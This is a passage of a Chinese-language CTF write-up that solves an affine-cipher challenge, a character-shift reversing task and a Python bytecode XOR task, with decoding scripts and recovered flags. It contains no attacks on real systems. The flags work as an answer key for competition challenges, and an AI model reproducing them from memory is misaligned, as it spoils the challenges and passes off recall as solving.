class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><br>flag = <span class="hljs-string">&#x27;ypctf&#123;*************&#125;&#x27;</span>    <span class="hljs-comment">#部分明文</span><br><br>data = [<span class="hljs-number">1843</span>, <span class="hljs-number">52</span>, <span class="hljs-number">1511</span>, <span class="hljs-number">848</span>, <span class="hljs-number">85</span>, <span class="hljs-number">218</span>, <span class="hljs-number">549</span>, <span class="hljs-number">483</span>, <span class="hljs-number">847</span>, <span class="hljs-number">449</span>, <span class="hljs-number">715</span>, <span class="hljs-number">682</span>, <span class="hljs-number">449</span>, <span class="hljs-number">715</span>, <span class="hljs-number">1246</span>, <span class="hljs-number">1909</span>, <span class="hljs-number">450</span>, <span class="hljs-number">1843</span>, <span class="hljs-number">715</span>, <span class="hljs-number">51</span>, <span class="hljs-number">1113</span>, <span class="hljs-number">19</span>, <span class="hljs-number">1843</span>, <span class="hljs-number">715</span>, <span class="hljs-number">250</span>, <span class="hljs-number">85</span>, <span class="hljs-number">85</span>, <span class="hljs-number">1676</span>, <span class="hljs-number">1677</span>, <span class="hljs-number">1909</span>, <span class="hljs-number">715</span>, <span class="hljs-number">1511</span>, <span class="hljs-number">1676</span>, <span class="hljs-number">52</span>, <span class="hljs-number">483</span>, <span class="hljs-number">1909</span>, <span class="hljs-number">450</span>, <span class="hljs-number">616</span>]   <span class="hljs-comment">#密文待解密</span><br><br>plaindelta = <span class="hljs-built_in">ord</span>(flag[<span class="hljs-number">2</span>]) - <span class="hljs-built_in">ord</span>(flag[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(plaindelta) <span class="hljs-comment"># plaindelta = -13</span><br>cipherdalte = data[<span class="hljs-number">2</span>] - data[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(cipherdalte)<span class="hljs-comment"># cipherdalte = 1459</span><br><br>modulus = <span class="hljs-number">2023</span><br>a = gmpy2.invert(plaindelta, modulus) * cipherdalte % modulus<br>b = (data[<span class="hljs-number">1</span>] - a * <span class="hljs-built_in">ord</span>(flag[<span class="hljs-number">1</span>])) % modulus<br><span class="hljs-built_in">print</span>(a,b)<br><span class="hljs-comment"># a = 199</span><br><span class="hljs-comment"># b = 17</span><br>a_inv = gmpy2.invert(a, modulus)<br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data:<br>    result += <span class="hljs-built_in">chr</span>((c - b) * a_inv % modulus)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><strong>ypctf{Th75_i5_very_3azy_4ff1ne_c1pher}</strong></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h4 id="✓ezre-revenge"><a href="#✓ezre-revenge" class="headerlink" title="✓ezre revenge"></a>✓ezre revenge</h4><hr><p>I found flag maybe, but it’s encrypted. so do you know how to decrypt it?</p><h6 id="WP-5"><a href="#WP-5" class="headerlink" title="WP"></a>WP</h6><p>IDA64打开，发现有像密钥的东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;xIuDLDEvJKuDGyJvEuutJyLvFGuFJIyD&quot;</span><br></code></pre></td></tr></table></figure><p>查看一下main函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">int __cdecl main(int argc, const char **argv, const char **envp)<br>&#123;<br>  int i; // [rsp+14h] [rbp-7Ch]<br>  char *buf; // [rsp+18h] [rbp-78h]<br>  char input[100]; // [rsp+20h] [rbp-70h] BYREF<br>  int v7; // [rsp+8Ch] [rbp-4h]<br><br>  v7 = 0;<br>  printf(&quot;please input flaghere: &quot;);<br>  __isoc99_scanf(&quot;%32s&quot;, input);<br>  if ( strlen(input) == 32 )<br>  &#123;<br>    buf = (char *)malloc(0x20uLL);<br>    for ( i = 0; i &lt; 32; ++i )<br>      buf[i] = input[i] + 19;<br>    if ( !strcmp(buf, (const char *)(unsigned int)flag) )<br>      printf(&quot;Your flag is YPCTF&#123;%s&#125;\n&quot;, input);<br>    else<br>      printf(&quot;wrong flag!\n&quot;);<br>    free(buf);<br>    return 0;<br>  &#125;<br>  else<br>  &#123;<br>    printf(&quot;wrong flag!\n&quot;);<br>    return 0;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断输入的长度是否等于32个字符，正确时继续执行。然后<strong>将每个字符的ASCII值增加19</strong>，最后输出</p><p>上面的密钥刚好32个字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> miyao[<span class="hljs-number">33</span>],jiemi[<span class="hljs-number">33</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,miyao);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)<br>&#123;<br>jiemi[i]=miyao[i]<span class="hljs-number">-19</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;YPCTF&#123;%s&#125;&quot;</span>,jiemi);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br><span class="hljs-comment">//xIuDLDEvJKuDGyJvEuutJyLvFGuFJIyD</span><br></code></pre></td></tr></table></figure><p><strong>YPCTF{e6b1912c78b14f7c2bba7f9c34b376f1}</strong></p><h4 id="✓ezpy"><a href="#✓ezpy" class="headerlink" title="✓ezpy"></a>✓ezpy</h4><hr><p>maybe you learned python in last years… so, did you know <strong>PYC</strong> ?</p><p><em><a href="https://blog.csdn.net/weixin_46175201/article/details/133355086?spm=1001.2014.3001.5506">https://blog.csdn.net/weixin_46175201/article/details/133355086?spm=1001.2014.3001.5506</a></em></p><h6 id="WP-6"><a href="#WP-6" class="headerlink" title="WP"></a>WP</h6><p>发现附件是.pyc文件，用<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a>在线反编译，得到.py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python">FAK3 = <span class="hljs-string">&quot;YPCTF&#123;Really?_You&#x27;re_just_gonna_read_the_source?_That&#x27;s_it?_That&#x27;s_the_flag?&#125;&quot;</span><br>F1Ag = [<br>    <span class="hljs-number">74</span>,<br>    <span class="hljs-number">67</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">71</span>,<br>    <span class="hljs-number">85</span>,<br>    <span class="hljs-number">104</span>,<br>    <span class="hljs-number">68</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">35</span>,<br>    <span class="hljs-number">126</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">76</span>,<br>    <span class="hljs-number">103</span>,<br>    <span class="hljs-number">35</span>,<br>    <span class="hljs-number">76</span>,<br>    <span class="hljs-number">103</span>,<br>    <span class="hljs-number">123</span>,<br>    <span class="hljs-number">32</span>,<br>    <span class="hljs-number">76</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">35</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">76</span>,<br>    <span class="hljs-number">35</span>,<br>    <span class="hljs-number">117</span>,<br>    <span class="hljs-number">76</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">103</span>,<br>    <span class="hljs-number">91</span>,<br>    <span class="hljs-number">35</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">110</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_flag</span>(<span class="hljs-params">flag = <span class="hljs-literal">None</span></span>):<br>    buf = <span class="hljs-built_in">bytearray</span>(flag.encode())<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(buf) != <span class="hljs-number">36</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-literal">None</span>(<span class="hljs-number">36</span>):<br>        buf[i] ^= <span class="hljs-number">19</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">36</span>):<br>        <span class="hljs-keyword">if</span> buf[i] != F1Ag[i]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Wecloem to the world of Python, please input the flag: &#x27;</span>)<br>    <span class="hljs-keyword">if</span> check_flag(flag):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Congrats! You got it!&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Sorry, try again!&#x27;</span>)<br></code></pre></td></tr></table></figure><p>大致意思是检查输入的<strong>字节长度是否为 36，将每个字节与 19 进行异或</strong></p><p>下面异或脚本参考自<a href="http://t.csdnimg.cn/KVNLI">http://t.csdnimg.cn/KVNLI</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">list1=[ <br>    <span class="hljs-number">74</span>, <span class="hljs-number">67</span>, <span class="hljs-number">80</span>, <span class="hljs-number">71</span>, <span class="hljs-number">85</span>, <span class="hljs-number">104</span>, <span class="hljs-number">68</span>, <span class="hljs-number">118</span>, <span class="hljs-number">112</span>, <span class="hljs-number">35</span>, <span class="hljs-number">126</span>,<br>    <span class="hljs-number">118</span>, <span class="hljs-number">76</span>, <span class="hljs-number">103</span>, <span class="hljs-number">35</span>, <span class="hljs-number">76</span>, <span class="hljs-number">103</span>, <span class="hljs-number">123</span>, <span class="hljs-number">32</span>, <span class="hljs-number">76</span>, <span class="hljs-number">100</span>, <span class="hljs-number">35</span>,<br>    <span class="hljs-number">97</span>, <span class="hljs-number">127</span>, <span class="hljs-number">119</span>, <span class="hljs-number">76</span>, <span class="hljs-number">35</span>, <span class="hljs-number">117</span>, <span class="hljs-number">76</span>, <span class="hljs-number">99</span>, <span class="hljs-number">106</span>, <span class="hljs-number">103</span>, <span class="hljs-number">91</span>,<br>    <span class="hljs-number">35</span>, <span class="hljs-number">125</span>, <span class="hljs-number">110</span><br>]<br>flag=<span class="hljs-built_in">chr</span>(list1[<span class="hljs-number">0</span>]^<span class="hljs-number">19</span>)<br>i=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  <span class="hljs-keyword">if</span> i&lt;<span class="hljs-built_in">len</span>(list1):<br>    flag += <span class="hljs-built_in">chr</span>(list1[i]^<span class="hljs-number">19</span>)<br>    i+=<span class="hljs-number">1</span><br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p><strong>YPCTF{Wec0me_t0_th3_w0rld_0f_pytH0n}</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
